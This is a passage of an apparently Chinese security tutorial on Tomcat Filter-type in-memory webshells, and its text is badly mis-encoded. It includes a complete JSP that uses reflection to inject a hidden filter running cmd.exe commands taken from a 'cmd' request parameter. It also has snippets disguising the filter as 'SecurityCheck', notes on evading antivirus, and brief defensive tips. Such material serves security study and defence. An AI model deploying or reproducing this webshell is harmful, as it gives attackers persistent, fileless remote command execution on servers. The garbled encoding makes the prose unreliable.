ç›´æ¥é€€å›ï¼ˆè¿”å›<span class="number">403</span>é”™è¯¯ï¼‰</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### **ä¸‰ã€åŠ¨æ€æ³¨å†ŒFilterï¼ˆå®‰æ’å†…é¬¼åˆ†æ‹£å‘˜ï¼‰**</span><br><span class="line">é»‘å®¢è¦å®‰æ’ä¸€ä¸ª **â€œå·æ‹åŒ…è£¹ä¿¡æ¯â€** çš„æ¶æ„åˆ†æ‹£å‘˜ï¼ˆå†…å­˜é©¬Filterï¼‰ï¼š  </span><br><span class="line"><span class="number">1.</span> **ä¼ªé€ æ¡£æ¡ˆ**ï¼ˆæ“ä½œFilterDefsï¼‰  </span><br><span class="line">   ```<span class="type">java</span>  </span><br><span class="line">   <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">   filterDef.setFilterName(<span class="string">&quot;é—´è°åˆ†æ‹£å‘˜&quot;</span>);  </span><br><span class="line">   filterDef.setFilterClass(EvilFilter.class);  </span><br></pre></td></tr></table></figure><br>   <em>ç›¸å½“äºåœ¨æ¡£æ¡ˆåº“é‡Œå¡å…¥å‡èº«ä»½</em></p><ol start="2"><li><p><strong>ç»‘å®šåˆ†æ‹£åŒºåŸŸ</strong>ï¼ˆæ“ä½œFilterMapsï¼‰  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filterMap = <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);  <span class="comment">// ç›‘å¬æ‰€æœ‰åŒ…è£¹  </span></span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;é—´è°åˆ†æ‹£å‘˜&quot;</span>);  </span><br></pre></td></tr></table></figure><p><em>ä¿®æ”¹åˆ†æ‹£è§„åˆ™è¡¨ï¼Œè®©æ‰€æœ‰åŒ…è£¹éƒ½ç»è¿‡è¿™ä¸ªå†…é¬¼</em></p></li><li><p><strong>è®¾ç½®æœ€é«˜ä¼˜å…ˆçº§</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST);  </span><br><span class="line">context.addFilterMapBefore(filterMap);  <span class="comment">// æ’é˜Ÿåˆ°æ‰€æœ‰åˆ†æ‹£å‘˜å‰é¢  </span></span><br></pre></td></tr></table></figure><p><em>è®©å†…é¬¼ç¬¬ä¸€ä¸ªå¤„ç†åŒ…è£¹ï¼Œæ–¹ä¾¿çªƒå–æ•°æ®</em></p></li></ol><hr><h3 id="å››ã€é˜²å¾¡å…³é”®ç‚¹"><a href="#å››ã€é˜²å¾¡å…³é”®ç‚¹" class="headerlink" title="å››ã€é˜²å¾¡å…³é”®ç‚¹"></a><strong>å››ã€é˜²å¾¡å…³é”®ç‚¹</strong></h3><ol><li><p><strong>ç›¯ç´§æ¡£æ¡ˆåº“</strong>ï¼ˆç›‘æ§FilterDefsï¼‰<br>å®šæœŸæ£€æŸ¥åˆ†æ‹£å‘˜æ¡£æ¡ˆåº“ï¼Œæœ‰æ²¡æœ‰æ¥è·¯ä¸æ˜çš„æ–°å‘˜å·¥ï¼ˆæœªåœ¨web.xmlå£°æ˜çš„Filterï¼‰</p></li><li><p><strong>å®¡æŸ¥åˆ†æ‹£è§„åˆ™è¡¨</strong>ï¼ˆåˆ†æFilterMapsï¼‰<br>ç”¨å·¥å…·æ‰«ææ˜¯å¦æœ‰ç›‘å¬ <code>/*</code> çš„é«˜å±åˆ†æ‹£å‘˜ï¼ˆæ¯”å¦‚å†°è&#x2F;å“¥æ–¯æ‹‰ç‰¹å¾Filterï¼‰</p></li><li><p><strong>é™åˆ¶æƒé™</strong><br>åˆ†æ‹£å‘˜ä¸è¯¥æœ‰æ‹†åŒ…è£¹çš„æƒé™ï¼ˆç¦æ­¢Filterè°ƒç”¨ <code>Runtime.exec()</code> ç­‰å±é™©APIï¼‰</p></li></ol><hr><h3 id="ä¸€å¥è¯æ€»ç»“"><a href="#ä¸€å¥è¯æ€»ç»“" class="headerlink" title="ä¸€å¥è¯æ€»ç»“"></a><strong>ä¸€å¥è¯æ€»ç»“</strong></h3><p>Tomcatçš„Filteræœºåˆ¶å°±åƒ <strong>ã€Œå¿«é€’åˆ†æ‹£æµæ°´çº¿ã€</strong>ï¼Œæ¯ä¸ªç¯èŠ‚çš„åˆ†æ‹£å‘˜ï¼ˆFilterï¼‰æŒ‰è§„åˆ™æ£€æŸ¥åŒ…è£¹ï¼ˆè¯·æ±‚ï¼‰ï¼Œè€Œå†…å­˜é©¬å°±æ˜¯é»‘å®¢å®‰æ’åœ¨æµæ°´çº¿ä¸Šçš„å†…é¬¼ï¼Œå·å·æ‹†çœ‹ä½ çš„å¿«é€’ï¼</p><ol><li>è·å–StandardContext</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„filter</li><li>å®ä¾‹åŒ–ä¸€ä¸ªFilterDefç±»ï¼ŒåŒ…è£…filterå¹¶å­˜æ”¾åˆ°StandardContext.filterDefsä¸­</li><li>å®ä¾‹åŒ–ä¸€ä¸ªFilterMapç±»ï¼Œå°†æˆ‘ä»¬çš„ Filter å’Œ urlpattern ç›¸å¯¹åº”ï¼Œå­˜æ”¾åˆ°StandardContext.filterMapsä¸­(ä¸€èˆ¬ä¼šæ”¾åœ¨é¦–ä½)</li><li>é€šè¿‡åå°„è·å–filterConfigsï¼Œå®ä¾‹åŒ–ä¸€ä¸ªFilterConfig(ApplicationFilterConfig)ç±»ï¼Œä¼ å…¥StandardContextä¸filterDefsï¼Œå­˜æ”¾åˆ°filterConfigä¸­</li></ol><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;!-- tomcat <span class="number">8</span> --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Longlone&quot;</span>;</span><br><span class="line">    <span class="comment">// è·å–StandardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–filterConfigs</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">â€‹        &#125;</span><br><span class="line"></span><br><span class="line">â€‹        <span class="meta">@Override</span></span><br><span class="line">â€‹        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">â€‹            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">â€‹            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">â€‹                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">â€‹                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/C&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">â€‹                <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">â€‹                servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, len));</span><br><span class="line">â€‹                process.destroy();</span><br><span class="line">â€‹                <span class="keyword">return</span>;</span><br><span class="line">â€‹            &#125;</span><br><span class="line">â€‹            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">â€‹        &#125;</span><br><span class="line"></span><br><span class="line">â€‹        <span class="meta">@Override</span></span><br><span class="line">â€‹        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">â€‹        &#125;</span><br><span class="line"></span><br><span class="line">â€‹    &#125;;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="comment">// FilterDef</span></span><br><span class="line">â€‹    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">â€‹    filterDef.setFilter(filter);</span><br><span class="line">â€‹    filterDef.setFilterName(name);</span><br><span class="line">â€‹    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">â€‹    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">â€‹    <span class="comment">// FilterMap</span></span><br><span class="line">â€‹    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">â€‹    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">â€‹    filterMap.setFilterName(name);</span><br><span class="line">â€‹    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">â€‹    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">â€‹    <span class="comment">//ApplicationFilterConfig</span></span><br><span class="line">â€‹    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">â€‹    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">â€‹    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">â€‹    filterConfigs.put(name, filterConfig);</span><br><span class="line"></span><br><span class="line">â€‹    out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨ <strong>ã€Œåœ¨å¿«é€’æµæ°´çº¿å®‰æ’å†…é¬¼ã€</strong> çš„æ¯”å–»æ¥è§£é‡Š Filterå‹å†…å­˜é©¬ çš„å®ç°åŸç†ï¼Œä¿è¯ä½ ç§’æ‡‚ğŸ‘‡</p><hr><h3 id="ä¸€ã€å®ç°æ­¥éª¤æ‹†è§£ï¼ˆå†…é¬¼æ¸—é€å…¨æµç¨‹ï¼‰"><a href="#ä¸€ã€å®ç°æ­¥éª¤æ‹†è§£ï¼ˆå†…é¬¼æ¸—é€å…¨æµç¨‹ï¼‰" class="headerlink" title="ä¸€ã€å®ç°æ­¥éª¤æ‹†è§£ï¼ˆå†…é¬¼æ¸—é€å…¨æµç¨‹ï¼‰"></a><strong>ä¸€ã€å®ç°æ­¥éª¤æ‹†è§£ï¼ˆå†…é¬¼æ¸—é€å…¨æµç¨‹ï¼‰</strong></h3><h4 id="1-æ‰¾åˆ°åˆ†æ‹£ä¸­å¿ƒæ§åˆ¶å®¤ï¼ˆè·å–-StandardContextï¼‰"><a href="#1-æ‰¾åˆ°åˆ†æ‹£ä¸­å¿ƒæ§åˆ¶å®¤ï¼ˆè·å–-StandardContextï¼‰" class="headerlink" title="1. æ‰¾åˆ°åˆ†æ‹£ä¸­å¿ƒæ§åˆ¶å®¤ï¼ˆè·å– StandardContextï¼‰"></a><strong>1. æ‰¾åˆ°åˆ†æ‹£ä¸­å¿ƒæ§åˆ¶å®¤ï¼ˆè·å– StandardContextï¼‰</strong></h4><p>â€¢ <strong>æ“ä½œç›®æ ‡</strong>ï¼šè·å– Tomcat çš„ <code>StandardContext</code> å¯¹è±¡ï¼ˆç›¸å½“äºå¿«é€’å…¬å¸çš„æ€»è°ƒåº¦ç³»ç»Ÿï¼‰<br>â€¢ <strong>å®ç°æ–¹å¼</strong>ï¼š<br>  é€šè¿‡åå°„ä» <code>Thread.currentThread().getContextClassLoader()</code> æˆ– <code>request.getServletContext()</code> ç­‰é€”å¾„é€†å‘è·å–<br>â€¢ <strong>å…³é”®æ€§</strong>ï¼š<br>  å°±åƒé»‘å®¢å¿…é¡»å…ˆæ‹¿åˆ°å¿«é€’å…¬å¸æ€»éƒ¨çš„é—¨ç¦å¡ï¼Œå¦åˆ™åç»­æ“ä½œæ— ä»è¿›è¡Œ  </p><h4 id="2-è®­ç»ƒå†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆç¼–å†™æ¶æ„-Filterï¼‰"><a href="#2-è®­ç»ƒå†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆç¼–å†™æ¶æ„-Filterï¼‰" class="headerlink" title="2. è®­ç»ƒå†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆç¼–å†™æ¶æ„ Filterï¼‰"></a><strong>2. è®­ç»ƒå†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆç¼–å†™æ¶æ„ Filterï¼‰</strong></h4><p>â€¢ <strong>ä»£ç ç¤ºä¾‹</strong>ï¼š<br>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(...)</span> &#123;  </span><br><span class="line">        <span class="comment">// æ£€æµ‹æ”»å‡»æŒ‡ä»¤ï¼ˆå¦‚è¯·æ±‚å‚æ•°å« cmd=whoamiï¼‰  </span></span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="comment">// æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶è¿”å›ç»“æœ  </span></span><br><span class="line">            Runtime.getRuntime().exec(...);  </span><br><span class="line">        &#125;  </span><br><span class="line">        chain.doFilter(...); <span class="comment">// æ”¾è¡Œè¯·æ±‚  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><br>â€¢ <strong>ä¼ªè£…æŠ€å·§</strong>ï¼š<br>  è®©å†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆFilterï¼‰çœ‹èµ·æ¥åƒæ­£å¸¸å‘˜å·¥ï¼Œä½†æš—ä¸­æ‰§è¡Œçªƒå¬æˆ–ç ´å  </p><h4 id="3-ä¼ªé€ åˆ†æ‹£å‘˜æ¡£æ¡ˆï¼ˆåˆ›å»º-FilterDefï¼‰"><a href="#3-ä¼ªé€ åˆ†æ‹£å‘˜æ¡£æ¡ˆï¼ˆåˆ›å»º-FilterDefï¼‰" class="headerlink" title="3. ä¼ªé€ åˆ†æ‹£å‘˜æ¡£æ¡ˆï¼ˆåˆ›å»º FilterDefï¼‰"></a><strong>3. ä¼ªé€ åˆ†æ‹£å‘˜æ¡£æ¡ˆï¼ˆåˆ›å»º FilterDefï¼‰</strong></h4><p>â€¢ <strong>æ“ä½œæ­¥éª¤</strong>ï¼š<br>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;SecurityCheck&quot;</span>); <span class="comment">// ä¼ªè£…æˆå®‰æ£€å‘˜  </span></span><br><span class="line">filterDef.setFilterClass(EvilFilter.class);  </span><br><span class="line">standardContext.addFilterDef(filterDef); <span class="comment">// å¡å…¥åˆ†æ‹£å‘˜æ¡£æ¡ˆåº“  </span></span><br></pre></td></tr></table></figure><br>â€¢ <strong>ä½œç”¨</strong>ï¼š<br>  ç›¸å½“äºåœ¨å¿«é€’å…¬å¸çš„å‘˜å·¥æ¡£æ¡ˆåº“ä¸­ä¼ªé€ ä¸€ä»½ã€Œå®‰æ£€å‘˜ã€çš„æ¡£æ¡ˆ  </p><h4 id="4-ç¯¡æ”¹åˆ†æ‹£è§„åˆ™è¡¨ï¼ˆåˆ›å»º-FilterMapï¼‰"><a href="#4-ç¯¡æ”¹åˆ†æ‹£è§„åˆ™è¡¨ï¼ˆåˆ›å»º-FilterMapï¼‰" class="headerlink" title="4. ç¯¡æ”¹åˆ†æ‹£è§„åˆ™è¡¨ï¼ˆåˆ›å»º FilterMapï¼‰"></a><strong>4. ç¯¡æ”¹åˆ†æ‹£è§„åˆ™è¡¨ï¼ˆåˆ›å»º FilterMapï¼‰</strong></h4><p>â€¢ <strong>å…³é”®ä»£ç </strong>ï¼š<br>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// ç›‘å¬æ‰€æœ‰åŒ…è£¹è·¯å¾„  </span></span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;SecurityCheck&quot;</span>);  </span><br><span class="line">standardContext.addFilterMapBefore(filterMap); <span class="comment">// æ’é˜Ÿåˆ°è§„åˆ™è¡¨é¦–ä½  </span></span><br></pre></td></tr></table></figure><br>â€¢ <strong>ä¸ºä½•è¦æ”¾é¦–ä½</strong>ï¼š<br>  ç¡®ä¿å†’ç‰Œåˆ†æ‹£å‘˜<strong>æœ€å…ˆæ¥è§¦åŒ…è£¹</strong>ï¼ˆä¼˜å…ˆå¤„ç†è¯·æ±‚ï¼‰ï¼Œæ–¹ä¾¿æ‹¦æˆªæˆ–ç¯¡æ”¹æ•°æ®  </p><h4 id="5-æ¿€æ´»å†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆåˆ›å»º-FilterConfigï¼‰"><a href="#5-æ¿€æ´»å†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆåˆ›å»º-FilterConfigï¼‰" class="headerlink" title="5. æ¿€æ´»å†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆåˆ›å»º FilterConfigï¼‰"></a><strong>5. æ¿€æ´»å†’ç‰Œåˆ†æ‹£å‘˜ï¼ˆåˆ›å»º FilterConfigï¼‰</strong></h4><p>â€¢ <strong>æ ¸å¿ƒä»£ç </strong>ï¼š<br>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åå°„è·å– filterConfigsï¼ˆéœ€æ ¹æ®Tomcatç‰ˆæœ¬è°ƒæ•´ï¼‰  </span></span><br><span class="line"><span class="type">Field</span> <span class="variable">configsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">configsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">Map&lt;String, FilterConfig&gt; filterConfigs = (Map) configsField.get(standardContext);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”Ÿæˆå†’ç‰Œå‘˜å·¥çš„å·¥ä½œè¯  </span></span><br><span class="line"><span class="type">FilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>(standardContext, filterDef);  </span><br><span class="line">filterConfigs.put(<span class="string">&quot;SecurityCheck&quot;</span>, filterConfig);  </span><br></pre></td></tr></table></figure><br>â€¢ <strong>æ ¸å¿ƒä½œç”¨</strong>ï¼š<br>  ç»™å†’ç‰Œåˆ†æ‹£å‘˜é¢å‘ã€Œå·¥ä½œè¯ã€ï¼ˆFilterConfigï¼‰ï¼Œè®©åˆ†æ‹£ç³»ç»Ÿè®¤ä¸ºä»–æ˜¯åˆæ³•å‘˜å·¥  </p><hr><h3 id="äºŒã€ä¸ºä»€ä¹ˆèƒ½å®ç°å†…å­˜é©»ç•™ï¼Ÿ"><a href="#äºŒã€ä¸ºä»€ä¹ˆèƒ½å®ç°å†…å­˜é©»ç•™ï¼Ÿ" class="headerlink" title="äºŒã€ä¸ºä»€ä¹ˆèƒ½å®ç°å†…å­˜é©»ç•™ï¼Ÿ"></a><strong>äºŒã€ä¸ºä»€ä¹ˆèƒ½å®ç°å†…å­˜é©»ç•™ï¼Ÿ</strong></h3><table><thead><tr><th><strong>æŠ€æœ¯ç‚¹</strong></th><th><strong>ç±»æ¯”è§£é‡Š</strong></th><th><strong>ç»•è¿‡æ£€æµ‹çš„å…³é”®</strong></th></tr></thead><tbody><tr><td><strong>ä¸è½åœ°æ–‡ä»¶</strong></td><td>å†’ç‰Œåˆ†æ‹£å‘˜æ²¡æœ‰çº¸è´¨æ¡£æ¡ˆï¼ˆæ— .classæ–‡ä»¶ï¼‰</td><td>ä¼ ç»Ÿæ€æ¯’è½¯ä»¶åªæŸ¥æ¡£æ¡ˆåº“ï¼Œæ— æ³•å‘ç°å†…å­˜ä¸­çš„å¹½çµå‘˜å·¥</td></tr><tr><td><strong>å¯„ç”Ÿåœ¨StandardContext</strong></td><td>å†…é¬¼ä¿¡æ¯å†™å…¥å¿«é€’å…¬å¸æ€»éƒ¨çš„è°ƒåº¦ç³»ç»Ÿï¼ˆå†…å­˜å¯¹è±¡ï¼‰</td><td>Tomcaté‡å¯å‰æ¶æ„é…ç½®ä¼šä¸€ç›´ç”Ÿæ•ˆ</td></tr><tr><td><strong>åŠ¨æ€æ³¨å†Œæœºåˆ¶</strong></td><td>åˆ©ç”¨Tomcatå…è®¸ä¸´æ—¶å·¥ï¼ˆåŠ¨æ€Filterï¼‰çš„åˆæ³•åŠŸèƒ½</td><td>ç®¡ç†å‘˜å¾ˆéš¾åŒºåˆ†æ­£å¸¸åŠ¨æ€æ³¨å†Œå’Œæ¶æ„æ³¨å…¥</td></tr></tbody></table><hr><h3 id="ä¸‰ã€å®Œæ•´æ”»å‡»æµç¨‹å›¾"><a href="#ä¸‰ã€å®Œæ•´æ”»å‡»æµç¨‹å›¾" class="headerlink" title="ä¸‰ã€å®Œæ•´æ”»å‡»æµç¨‹å›¾"></a><strong>ä¸‰ã€å®Œæ•´æ”»å‡»æµç¨‹å›¾</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµè§ˆå™¨è¯·æ±‚ â†’ Tomcatæ¥æ”¶è¯·æ±‚  </span><br><span class="line">     â†“  </span><br><span class="line">StandardContext è°ƒåº¦ â†’ ä¼˜å…ˆè°ƒç”¨æ¶æ„Filterï¼ˆé¦–ä½ï¼‰  </span><br><span class="line">     â†“  </span><br><span class="line">æ¶æ„Filterè§£æå‚æ•° â†’ è‹¥å«æ”»å‡»æŒ‡ä»¤åˆ™æ‰§è¡Œç³»ç»Ÿå‘½ä»¤  </span><br><span class="line">     â†“  </span><br><span class="line">è¿”å›ç¯¡æ”¹åçš„å“åº” â†’ æµè§ˆå™¨æ˜¾ç¤ºç»“æœ  </span><br></pre></td></tr></table></figure><hr><h3 id="å››ã€é˜²å¾¡è¦ç‚¹"><a href="#å››ã€é˜²å¾¡è¦ç‚¹" class="headerlink" title="å››ã€é˜²å¾¡è¦ç‚¹"></a><strong>å››ã€é˜²å¾¡è¦ç‚¹</strong></h3><ol><li><p><strong>ç›‘æ§StandardContextå˜åŠ¨</strong>ï¼š<br>å®šæœŸæ£€æŸ¥ <code>filterDefs</code> å’Œ <code>filterMaps</code> æ˜¯å¦æœ‰æœªæˆæƒçš„æ–°å¢æ¡ç›®  </p></li><li><p><strong>ç¦ç”¨é«˜å±API</strong>ï¼š<br>é€šè¿‡å®‰å…¨ç­–ç•¥é™åˆ¶ <code>Runtime.exec()</code> ç­‰å±é™©æ–¹æ³•çš„è°ƒç”¨  </p></li><li><p><strong>ä½¿ç”¨RASPé˜²æŠ¤</strong>ï¼š<br>åœ¨åº”ç”¨å±‚éƒ¨ç½²è¿è¡Œæ—¶é˜²æŠ¤ï¼ˆç±»ä¼¼åœ¨åˆ†æ‹£æµæ°´çº¿è£…Xå…‰æœºï¼‰</p></li></ol><hr><h3 id="ä¸€å¥è¯æ€»ç»“-1"><a href="#ä¸€å¥è¯æ€»ç»“-1" class="headerlink" title="ä¸€å¥è¯æ€»ç»“"></a><strong>ä¸€å¥è¯æ€»ç»“</strong></h3><p>Filterå‹å†…å­˜é©¬å°±åƒ <strong>ã€Œå¯„ç”Ÿåœ¨Tomcatå¤§è„‘ä¸­çš„æœ¨é©¬ç—…æ¯’ã€</strong>ï¼Œé€šè¿‡ç¯¡æ”¹å†…å­˜ä¸­çš„é…ç½®æ•°æ®å®ç°æ— æ–‡ä»¶é©»ç•™ï¼Œæ˜¯Webå®‰å…¨é¢†åŸŸçš„é¡¶çº§æ¸—é€æ‰‹æ³•ï¼</p><h1 id="Tomcat-Listener"><a href="#Tomcat-Listener" class="headerlink" title="Tomcat-Listener"></a>Tomcat-Listener</h1><p>åœ¨Java WEBä¸­ï¼Œä¸‰ç»„ä»¶çš„æ‰§è¡Œé¡ºåºæ˜¯Listener -&gt; Filter -&gt; Servletã€‚</p><p>Tomcatä¸­çš„Listeneræ¥æºäºä¸¤éƒ¨åˆ†ï¼šä¸€æ˜¯ä»<code>web.xml</code>é…ç½®æ–‡ä»¶ä¸­å®ä¾‹åŒ–çš„Listenerï¼Œè¿™éƒ¨åˆ†æˆ‘ä»¬æ— æ³•æ§åˆ¶ï¼›äºŒæ˜¯<code>applicationEventListenersList</code>ä¸­çš„Listenerï¼Œåè€…æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚åªéœ€å‘<code>applicationEventListenersList</code>ä¸­æ·»åŠ æ¶æ„Listenerï¼Œå³å¯å®ç°ç›®æ ‡ã€‚</p><p>Java Web å¼€å‘ä¸­çš„ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯ Applicationã€Session å’Œ Request ä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚</p><p>å’Œä¹‹å‰ Filter å‹å†…å­˜é©¬çš„åŸç†å…¶å®æ˜¯ä¸€æ ·çš„ï¼Œä¹‹å‰æˆ‘ä»¬è¯´åˆ° Filter å†…å­˜é©¬éœ€è¦å®šä¹‰ä¸€ä¸ªå®ç° Filter æ¥å£çš„ç±»ï¼ŒListener ä¹Ÿæ˜¯ä¸€æ ·</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span 